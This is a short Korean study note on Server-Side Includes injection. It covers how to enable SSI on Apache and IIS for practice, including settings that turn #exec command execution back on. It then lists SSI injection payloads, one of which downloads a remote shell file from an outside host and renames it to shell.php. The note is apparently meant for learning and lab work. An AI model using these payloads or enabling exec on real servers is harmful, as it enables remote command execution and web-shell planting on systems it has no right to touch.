### SSI Injection?

Server-Side Includes (SSI) Injection 로 과거 서버 환경 정보 활용에 사용했던 기능이다.

현재는 더 좋은 명령어 들이 존재하기 때문에 거의 사용되지 않는다.

따라서 기본 설정은 대부분 비활성화 되어 있고, 일부러 활성화 시키지 않는 이상 실습 조차 어렵다.

### httpd.conf 를 LoadModule 로 사용하는 설정의 경우

LoadModule include_module modules/mod_include.so

의 #을 확인한다.(주석처리(#)가 있다면 제거)

### apache2의 mods-available 폴더를 사용하는 환경인 경우

ln -s /etc/apache2/mods-available/include.load /etc/apache2/mods-enabled

### httpd.conf 또는 /etc/apache2/sites-available/000-default 파일 편집

<pre><code>
＜Directory>
    Options FollowSymLinks Includes
    AllowOverride All
    Order allow,deny
    Allow from all
    AddType text/html .shtml
    AddOutputFilter INCLUDES .shtml
＜/Directory>
</code></pre>

### 사용 가능 구문

<pre><code>
＜!--#exec cmd="ls" -->
＜!--#exec cmd="cd /root/dir/">
＜!--#exec cmd="wget http://mysite.com/shell.txt | rename shell.txt shell.php" -->
＜!--#exec cmd="dir" -->
＜!--#exec cmd="cd C:\admin\dir">
＜!--#config errmsg="File not found, informs users and password"-->
＜!--#echo var="DOCUMENT_NAME" -->
＜!--#echo var="DOCUMENT_URI" -->
＜!--#config timefmt="A %B %d %Y %r"-->
＜!--#fsize file="ssi.shtml" -->
＜!--#include file=”UUUUUUUU...UU”-->
</code></pre>

### The CMD option is not enabled for #EXEC calls

IIS에서

C:\Windows\System32\inetsrv>appcmd.exe set config "www.도메인.co.kr" -section:system.webServer/serverSideInclude /ssiExecDisable:"**True/False**" /commit:apphost

명령어를 이용해 명령 실행 활성화/비활성화를 설정할 수 있다.(재부팅 불필요)

#EXEC calls have been disabled for this virtual path

HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W3SVC\Parameters key에 SSIEnableCmdDirective 값을 1로 설정한다.
